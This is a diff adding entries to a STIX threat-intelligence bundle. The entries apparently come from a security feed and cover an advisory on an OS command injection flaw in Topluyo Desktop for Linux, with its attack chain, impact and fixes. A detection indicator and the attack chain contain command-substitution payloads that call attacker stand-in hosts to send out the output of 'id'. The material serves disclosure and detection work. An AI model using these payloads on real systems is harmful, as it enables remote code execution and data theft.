@@ -1,6 +1,6 @@
 {
   "type": "bundle",
-  "id": "bundle--9ce95e9a-e353-5635-b23a-e71c343141cd",
+  "id": "bundle--a71fc1ca-562d-5acc-be47-571ad5ce0823",
   "objects": [
     {
       "type": "attack-pattern",
@@ -5635,6 +5635,19 @@
       "pattern": "[ipv4-addr:value = '144.172.64.128']",
       "pattern_type": "stix",
       "valid_from": "2026-10-17T06:39:10.000Z"
+    },
+    {
+      "type": "indicator",
+      "spec_version": "2.1",
+      "id": "indicator--f7e8b78c-b777-5c13-b115-24a498fe46ab",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-02T13:26:29.000Z",
+      "modified": "2026-11-02T13:26:29.000Z",
+      "name": "url: http://attacker.example/$(curl$IFS-s$IFSsaldirgan.com/$(id|base64))",
+      "description": "Malicious URL payload demonstrating command substitution via IFS and base64 encoding.",
+      "pattern": "[url:value = 'http://attacker.example/$(curl$IFS-s$IFSsaldirgan.com/$(id|base64))']",
+      "pattern_type": "stix",
+      "valid_from": "2026-11-02T13:26:29.000Z"
     },
     {
       "type": "indicator",
@@ -34678,6 +34691,17 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
+      "id": "relationship--62e60fd4-8a39-5bf2-99a1-2b14d9eaa772",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-02T13:26:29.000Z",
+      "modified": "2026-11-02T13:26:29.000Z",
+      "relationship_type": "uses",
+      "source_ref": "report--2423ebf2-093e-5530-8163-c4f1309cae54",
+      "target_ref": "indicator--f7e8b78c-b777-5c13-b115-24a498fe46ab"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
       "id": "relationship--62e6cde8-7b5c-5214-b2ec-6c785f819876",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2025-01-01T00:00:00.000Z",
@@ -54005,6 +54029,17 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
+      "id": "relationship--a233c2fc-3fe1-5a22-a500-74e680fcf512",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-02T13:26:29.000Z",
+      "modified": "2026-11-02T13:26:29.000Z",
+      "relationship_type": "uses",
+      "source_ref": "report--2423ebf2-093e-5530-8163-c4f1309cae54",
+      "target_ref": "attack-pattern--7013871c-d448-55a4-81ed-cffcce61c4ef"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
       "id": "relationship--a2434d43-a386-59f3-b116-07c9b0f11f39",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2025-01-01T00:00:00.000Z",
@@ -67652,6 +67687,17 @@
       "relationship_type": "has",
       "source_ref": "software--67afa3a3-13f7-5f0c-9ae0-b49e4d8ec818",
       "target_ref": "vulnerability--46aca78b-1490-5bc6-9a0a-cf6efbfd038c"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--d00bd813-5b74-5db3-b7ee-09db07dded56",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2025-01-01T00:00:00.000Z",
+      "modified": "2025-01-01T00:00:00.000Z",
+      "relationship_type": "has",
+      "source_ref": "software--9d42b2f8-113b-5178-bb15-ccf3fef1cb25",
+      "target_ref": "vulnerability--d195a5f9-05a7-5c59-97db-961099052f23"
     },
     {
       "type": "relationship",
@@ -96715,6 +96761,63 @@
       },
       "x_craftedsignal_cvss_max": 9.9,
       "x_craftedsignal_epss_max": 0.00454,
+      "x_craftedsignal_kev_status": "false"
+    },
+    {
+      "type": "report",
+      "spec_version": "2.1",
+      "id": "report--2423ebf2-093e-5530-8163-c4f1309cae54",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2026-11-02T13:26:29.000Z",
+      "modified": "2026-11-02T13:26:29.000Z",
+      "name": "Topluyo Desktop for Linux OS Command Injection (CVE-2026-115904)",
+      "description": "## Overview\nTopluyo Desktop for Linux contains an OS Command Injection vulnerability (CVE-2026-115904) in the `openExternalLinks()` function within `utils.js`. The application improperly neutralizes user-supplied URLs before passing them to the `child_process.exec()` function, which executes commands via `/bin/sh -c`. Attackers can trigger arbitrary code execution by crafting a malicious URL containing shell meta-characters. The vulnerability was patched in version 2026.9.2410.\n\n## Attack Chain\n1. Attacker crafts a URL string containing command substitution syntax, such as `$(curl -s attacker.com/id)`.\n2. Attacker hosts or delivers the malicious link to a target user via the application interface (e.g., chat, notification, or link preview).\n3. The target user interacts with the link (clicks).\n4. The `openExternalLinks()` function receives the URL.\n5. The application invokes `child_process.exec(\"xdg-open [malicious_url]\")`.\n6. The system shell interprets the command substitution inside the URL parameter before executing `xdg-open`.\n7. Arbitrary commands execute in the context of the user running the Topluyo Desktop application.\n\n## Impact\nSuccessful exploitation leads to full remote code execution in the context of the current desktop user. Impact includes arbitrary file access, credential theft, persistence installation (e.g., modifying `~/.bashrc` or `autostart`), and the establishment of reverse shells.\n\n## Recommendation\n- Upgrade Topluyo Desktop for Linux to version 2026.9.2410 or later immediately.\n- For developers, replace `child_process.exec()` with `child_process.execFile()` when handling external system commands to prevent shell interpretation of arguments.\n- Implement strict allow-listing for URL schemes (e.g., limit to `http:` and `https:`) before passing values to system calls.\n",
+      "published": "2026-11-02T13:26:29.000Z",
+      "labels": [
+        "command-injection",
+        "desktop-app",
+        "linux",
+        "rce"
+      ],
+      "object_refs": [
+        "attack-pattern--7013871c-d448-55a4-81ed-cffcce61c4ef",
+        "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+        "indicator--f7e8b78c-b777-5c13-b115-24a498fe46ab",
+        "software--9d42b2f8-113b-5178-bb15-ccf3fef1cb25",
+        "vulnerability--d195a5f9-05a7-5c59-97db-961099052f23"
+      ],
+      "external_references": [
+        {
+          "source_name": "craftedsignal",
+          "external_id": "brief-2026-11-02-topluyo-rce",
+          "url": "https://feed.craftedsignal.io/briefs/2026-11-topluyo-rce/"
+        },
+        {
+          "source_name": "reference",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-115904"
+        },
+        {
+          "source_name": "reference",
+          "url": "https://sploitus.com/exploit?id=0EA6C5A8-77C6-5E7E-9B86-1DDDE014E8AA"
+        },
+        {
+          "source_name": "reference",
+          "url": "https://sploitus.com/exploit?id=0EA6C5A8-77C6-5E7E-9B86-1DDDE014E8AA\u0026utm_source=rss\u0026utm_medium=rss"
+        }
+      ],
+      "confidence": 95,
+      "x_craftedsignal_brief_id": "brief-2026-11-02-topluyo-rce",
+      "x_craftedsignal_event_id": "brief-2026-11-02-topluyo-rce",
+      "x_craftedsignal_revision": 1,
+      "x_craftedsignal_canonical_url": "https://feed.craftedsignal.io/briefs/2026-11-topluyo-rce/",
+      "x_craftedsignal_activity_at": "2026-11-02T13:26:29.000Z",
+      "x_craftedsignal_severity": "critical",
+      "x_craftedsignal_type": "advisory",
+      "x_craftedsignal_exploitation_evidence": {
+        "status": "unknown"
+      },
+      "x_craftedsignal_cvss_max": 9.6,
+      "x_craftedsignal_epss_max": 0.00743,
       "x_craftedsignal_kev_status": "false"
     },
     {
@@ -199251,6 +199354,13 @@
     {
       "type": "software",
       "spec_version": "2.1",
+      "id": "software--9d42b2f8-113b-5178-bb15-ccf3fef1cb25",
+      "name": "Topluyo Desktop For Linux (\u003c 2026.9.2410)",
+      "vendor": "Topluyo"
+    },
+    {
+      "type": "software",
+      "spec_version": "2.1",
       "id": "software--9d42f3d6-c058-5755-a04c-a217256b9575",
       "name": "Connect Secure (25.1.2.2 and older)",
       "vendor": "Ivanti"
@@ -235512,6 +235622,22 @@
           "source_name": "cve",
           "external_id": "CVE-2022-45451",
           "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-45451"
+        }
+      ]
+    },
+    {
+      "type": "vulnerability",
+      "spec_version": "2.1",
+      "id": "vulnerability--d195a5f9-05a7-5c59-97db-961099052f23",
+      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
+      "created": "2025-01-01T00:00:00.000Z",
+      "modified": "2025-01-01T00:00:00.000Z",
+      "name": "CVE-2026-115904",
+      "external_references": [
+        {
+          "source_name": "cve",
+          "external_id": "CVE-2026-115904",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-115904"
         }
       ]
     },
